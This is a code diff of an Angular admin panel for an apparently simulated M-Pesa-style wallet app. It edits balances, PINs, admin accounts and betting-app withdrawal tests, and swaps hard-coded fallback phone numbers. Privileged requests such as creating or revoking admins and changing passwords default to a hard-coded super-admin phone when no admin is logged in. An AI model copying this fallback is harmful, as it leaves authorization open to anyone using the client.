-                        <button type="button" class="table-step-btn plus-big" (click)="openBalanceModal(adm, 'add', 5000)" title="Add Ksh 5,000">+5K</button>
-                      </div>
-                    </td>
-                    <td>
-                      <input
-                        type="number"
-                        step="0.01"
-                        class="inline-balance-input"
-                        [(ngModel)]="adm['_editFuliza']"
-                        [placeholder]="(adm.wallet?.fuliza ?? 100) | number:'1.2-2'"
-                        style="width:90px;padding:4px 6px;border:1px solid #ddd;border-radius:6px;"
-                      />
-                    </td>
-                    <td style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
-                      <button 
-                        type="button" 
-                        class="primary-btn edit-full-btn"
-                        style="padding:6px 10px;font-size:12px;background:#1f6feb;border:1px solid #388bfd;color:#fff;"
-                        (click)="openEditAdminModal(adm)"
-                        title="Edit all admin details">
-                        ✏️ Edit
-                      </button>
-                      <button
-                        type="button"
-                        class="primary-btn"
-                        style="padding:6px 12px;font-size:12px;display:inline-flex;align-items:center;gap:4px;background:#00c853;color:#000;"
-                        (click)="openBalanceModal(adm, 'add', 1000)"
-                        title="Adjust balance with options">
-                        ➕ Adjust Balance
-                      </button>
-                      <button
-                        type="button"
-                        class="primary-btn"
-                        style="padding:6px 10px;font-size:12px;background:#21262d;border:1px solid #30363d;color:#c9d1d9;"
-                        (click)="handleAdjustAdminBalance(adm)"
-                        title="Save manual inputs">
-                        💾 Save
-                      </button>
-                      <button
-                        type="button"
-                        class="delete-icon-btn"
-                        [disabled]="adm.phone === currentAdmin?.phone || adm.phone === '0722220165'"
-                        (click)="handleRemoveAdmin(adm.phone)"
-                        title="Revoke Admin Access">
-                        ✕ Revoke
-                      </button>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
             </div>
           </div>
         </div>
@@ -1481,7 +1196,7 @@ import { PwaService } from '../../services/pwa.service';
           <div class="section-card danger-zone">
             <h3 class="card-title text-red">Danger Zone / Restore Initial State</h3>
             <p class="card-desc">
-              Reset the database back to default initial values (User: Alex Wanjiku, Balance: Ksh 61.66, Fuliza: Ksh 100.00).
+              Reset the database back to default initial values (User: Brian, Balance: Ksh 61.66, Fuliza: Ksh 100.00).
             </p>
             <button class="danger-btn" (click)="resetAllData()">
               Reset All Database Records to Default
@@ -1717,7 +1432,7 @@ import { PwaService } from '../../services/pwa.service';
                 </div>
                 <div class="qc-field">
                   <label>Receiving Phone</label>
-                  <input type="text" [(ngModel)]="simPhone" class="qc-input" [placeholder]="currentAdmin?.phone || 'e.g. 07XXXXXXXX'" />
+                  <input type="text" [(ngModel)]="simPhone" class="qc-input" placeholder="e.g. 07XXXXXXXX" />
                 </div>
                 <div class="qc-field">
                   <label>Amount (Ksh)</label>
@@ -2505,6 +2220,49 @@ import { PwaService } from '../../services/pwa.service';
       display: flex;
       gap: 4px;
     }
+    .abc-top {
+      transition: background 0.15s ease, opacity 0.15s ease;
+      padding: 4px 6px;
+      margin: -4px -6px;
+      border-radius: 8px;
+    }
+    .abc-top:hover {
+      background: rgba(255, 255, 255, 0.04);
+    }
+    .card-edit-btn {
+      background: rgba(56, 139, 253, 0.15);
+      border: 1px solid #388bfd;
+      color: #58a6ff;
+      border-radius: 6px;
+      padding: 4px 10px;
+      font-size: 11.5px;
+      font-weight: 700;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      transition: all 0.15s ease;
+    }
+    .card-edit-btn:hover {
+      background: #388bfd;
+      color: #ffffff;
+      transform: scale(1.03);
+    }
+    .card-revoke-btn {
+      background: rgba(248, 81, 73, 0.1);
+      border: 1px solid rgba(248, 81, 73, 0.35);
+      color: #f85149;
+      border-radius: 6px;
+      padding: 4px 10px;
+      font-size: 11px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.15s ease;
+    }
+    .card-revoke-btn:hover {
+      background: #f85149;
+      color: #ffffff;
+    }
     .abc-balance-box {
       background: #0f141a;
       border: 1px solid #26333f;
@@ -2725,11 +2483,21 @@ import { PwaService } from '../../services/pwa.service';
       opacity: 0.9;
     }
 
-    /* Mobile Settings Selector Bar */
+    /* Uppermost Settings Navigation Bar (Upper-Left positioned) */
+    .top-nav-bar {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 14px;
+      width: 100%;
+    }
     .mobile-settings-bar {
       display: none;
-      margin-bottom: 16px;
       position: relative;
+      width: 100%;
+      max-width: 360px;
+      margin-bottom: 10px;
+      align-self: flex-start;
     }
     .msb-label {
       font-size: 11px;
@@ -2747,11 +2515,12 @@ import { PwaService } from '../../services/pwa.service';
       background: #1c2128;
       border: 1.5px solid #388bfd;
       border-radius: 12px;
-      padding: 12px 16px;
+      padding: 10px 14px;
       color: #ffffff;
       font-size: 14px;
       font-weight: 600;
       box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+      cursor: pointer;
     }
     .msb-btn-left {
       display: flex;
@@ -2776,13 +2545,13 @@ import { PwaService } from '../../services/pwa.service';
       color: #58a6ff;
     }
 
-    /* Mobile Dropdown Menu Sheet */
+    /* Mobile Dropdown Menu Sheet (Upper-Left Anchor) */
     .mobile-nav-dropdown {
       position: absolute;
-      top: 100%;
+      top: calc(100% + 6px);
       left: 0;
-      right: 0;
-      margin-top: 8px;
+      width: 340px;
+      max-width: calc(100vw - 28px);
       background: #161b22;
       border: 1.5px solid #30363d;
       border-radius: 14px;
@@ -3898,6 +3667,7 @@ export class AdminComponent implements OnInit {
   editAdminBalance: number | null = null;
   editAdminFuliza: number | null = null;
   isUpdatingAdmin: boolean = false;
+  showCreateAdminCard: boolean = false;
 
   // Super Admin Quick Control Panel State
   quickSelectedPhone = '0722220165';
@@ -4095,6 +3865,7 @@ export class AdminComponent implements OnInit {
         .filter(Boolean);
 
       const payload = {
+        requesterPhone: this.currentAdmin?.phone || '0722220165',
         targetPhone: this.editingAdmin.phone,
         name: this.editAdminName,
         newPhone: this.editAdminPhone,
@@ -4107,6 +3878,28 @@ export class AdminComponent implements OnInit {
 
       const res = await this.api.updateAdminFull(payload);
       if (res && res.success) {
+        if (this.currentAdmin && this.currentAdmin.phone === this.editingAdmin.phone) {
+          this.currentAdmin = {
+            ...this.currentAdmin,
+            name: this.editAdminName,
+            phone: this.editAdminPhone || this.currentAdmin.phone,
+            role: this.editAdminRole || this.currentAdmin.role,
+            workingPins: pins.length > 0 ? pins : this.currentAdmin.workingPins,
+            wallet: {
+              ...(this.currentAdmin.wallet || {} as any),
+              name: this.editAdminName,
+              balance: this.editAdminBalance ?? 61.66,
+              fuliza: this.editAdminFuliza ?? 100.00
+            }
+          };
+          this.userForm.name = this.editAdminName;
+          if (this.editAdminBalance !== null) {
+            this.userForm.balance = this.editAdminBalance;
+          }
+          if (typeof localStorage !== 'undefined') {
+            localStorage.setItem('mpesa_current_admin', JSON.stringify(this.currentAdmin));
+          }
+        }
         this.notify(res.message || 'Admin updated successfully!', 'success');
         this.closeEditAdminModal();
         this.loadData();
@@ -4450,7 +4243,7 @@ export class AdminComponent implements OnInit {
   // USER & ISOLATED BALANCES
   // =============================================================
   saveUserChanges(notifyUser = true): void {
-    const adminPhone = this.currentAdmin?.phone || '0798765485';
+    const adminPhone = this.currentAdmin?.phone || '0722220165';
     this.api.updateUserAdmin(this.userForm, adminPhone).subscribe({
       next: () => {
         if (notifyUser) {
@@ -4471,7 +4264,7 @@ export class AdminComponent implements OnInit {
       this.notify('Please enter a valid 4-digit PIN (e.g. 2580).', 'error');
       return;
     }
-    const adminPhone = this.currentAdmin?.phone || '0798765485';
+    const adminPhone = this.currentAdmin?.phone || '0722220165';
     const pinToAdd = this.newWorkingPin;
     this.api.addWorkingPin(adminPhone, pinToAdd).subscribe({
       next: (res) => {
@@ -4493,7 +4286,7 @@ export class AdminComponent implements OnInit {
       this.notify('You must keep at least one working PIN for your account. Add your new custom PIN first before deleting this one.', 'error');
       return;
     }
-    const adminPhone = this.currentAdmin?.phone || '0798765485';
+    const adminPhone = this.currentAdmin?.phone || '0722220165';
     this.api.deleteWorkingPin(adminPhone, pin).subscribe({
       next: (res) => {
         if (res.success) {
@@ -4513,7 +4306,7 @@ export class AdminComponent implements OnInit {
       this.notify('Please enter a new password.', 'error');
       return;
     }
-    const adminPhone = this.currentAdmin?.phone || '0798765485';
+    const adminPhone = this.currentAdmin?.phone || '0722220165';
     this.api.changeAdminPassword(adminPhone, this.currentPassInput, this.newPassInput).subscribe({
       next: (res) => {
         if (res.success) {
@@ -4538,7 +4331,7 @@ export class AdminComponent implements OnInit {
       return;
     }
 
-    const requesterPhone = this.currentAdmin?.phone || '0798765485';
+    const requesterPhone = this.currentAdmin?.phone || '0722220165';
 
     this.api.createAdmin({
       requesterPhone,
@@ -4571,7 +4364,7 @@ export class AdminComponent implements OnInit {
       'Revoke Admin Access',
       `Revoke admin privileges and delete isolated account for phone: ${phone}?`,
       () => {
-        const requesterPhone = this.currentAdmin?.phone || '0798765485';
+        const requesterPhone = this.currentAdmin?.phone || '0722220165';
         this.api.revokeAdmin(phone, requesterPhone).subscribe({
           next: (res) => {
             if (res.success) {
@@ -4812,13 +4605,13 @@ export class AdminComponent implements OnInit {
   // CONNECTED APPS INTEGRATION METHODS
   // =============================================================
   simApp: string = 'pakabet';
-  simPhone: string = '0798765485';
+  simPhone: string = '';
   simAmount: number = 1500;
 
   appConnections: { app: string; appName: string; adminPhone: string; adminName: string }[] = [
-    { app: 'pakabet', appName: 'PAKABET', adminPhone: '0798765485', adminName: 'Alex Wanjiku' },
-    { app: 'vexbet', appName: 'VEXBET', adminPhone: '0798765485', adminName: 'Alex Wanjiku' },
-    { app: 'patatrader', appName: 'PATATRADER', adminPhone: '0798765485', adminName: 'Alex Wanjiku' }
+    { app: 'pakabet', appName: 'PAKABET', adminPhone: '0722220165', adminName: 'Brian' },
+    { app: 'vexbet', appName: 'VEXBET', adminPhone: '0722220165', adminName: 'Brian' },
+    { app: 'patatrader', appName: 'PATATRADER', adminPhone: '0722220165', adminName: 'Brian' }
   ];
 
   loadAppConnections(): void {
@@ -4833,8 +4626,8 @@ export class AdminComponent implements OnInit {
     return this.appConnections.find(c => c.app === appId) || {
       app: appId,
       appName: appId.toUpperCase(),
-      adminPhone: '0798765485',
-      adminName: 'Alex Wanjiku'
+      adminPhone: this.currentAdmin?.phone || '0722220165',
+      adminName: this.currentAdmin?.name || 'Brian'
     };
   }
 
@@ -4846,7 +4639,7 @@ export class AdminComponent implements OnInit {
   }
 
   async connectMyAccount(appId: string): Promise<void> {
-    const phone = this.currentAdmin?.phone || '0798765485';
+    const phone = this.currentAdmin?.phone || '0722220165';
     try {
       const res = await this.api.connectAppToAdmin(appId, phone);
       if (res && res.success) {
@@ -4878,7 +4671,7 @@ export class AdminComponent implements OnInit {
   }
 
   async testAppWithdrawal(app: string, amount: number): Promise<void> {
-    const targetPhone = this.currentAdmin?.phone || '0798765485';
+    const targetPhone = this.currentAdmin?.phone || '0722220165';
     try {
       const res = await this.api.triggerExternalWithdrawal({
         app,
@@ -4902,7 +4695,7 @@ export class AdminComponent implements OnInit {
       this.notify('Please enter a valid amount greater than 0', 'error');
       return;
     }
-    const phone = this.simPhone || this.currentAdmin?.phone || '0798765485';
+    const phone = this.simPhone || this.currentAdmin?.phone || '0722220165';
     try {
       const res = await this.api.triggerExternalWithdrawal({
         app: this.simApp,
